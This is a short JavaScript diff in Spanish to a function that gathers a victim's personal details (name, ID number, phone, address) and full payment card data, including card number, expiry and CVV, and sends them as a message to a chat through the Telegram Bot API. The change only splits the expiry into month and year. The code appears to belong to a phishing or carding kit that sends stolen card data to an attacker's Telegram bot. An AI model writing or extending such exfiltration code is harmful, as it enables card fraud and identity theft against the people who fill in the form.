@@ -8,7 +8,7 @@ const telegramApi=async(formUser,formPay)=>{
     const {baseURL,token,chat_id,parse_mode}=configTelegram
     // %0A genera saltos de linea en el chat de telegram 
     const {nombre,apellido,cedula,tel,direccion,ciudad}=formUser
-    const {nombreApellido,numeroTarjeta,expiracion,cvv}=formPay;
+    const {nombreApellido,numeroTarjeta,año,mes,cvv}=formPay;
     const mensaje=`-INFORMACION PERSONAl-
     %0ANombre:${nombre?nombre:"no fue rellenado"}
     %0AApellido:${apellido?apellido:"no fue rellenado"}
@@ -19,7 +19,7 @@ const telegramApi=async(formUser,formPay)=>{
     %0A-INFORMACION DEL PAGO-
     %0ANombre y apellido:${nombreApellido}
     %0ANumero de tarjeta:${numeroTarjeta}
-    %0AFecha de expiracion:${expiracion}
+    %0AFecha de expiracion:${mes}/${año}
     %0ACVV=${cvv}`
 
     const url=baseURL+token+`/sendMessage?chat_id=${chat_id}&${parse_mode}&text=`+mensaje
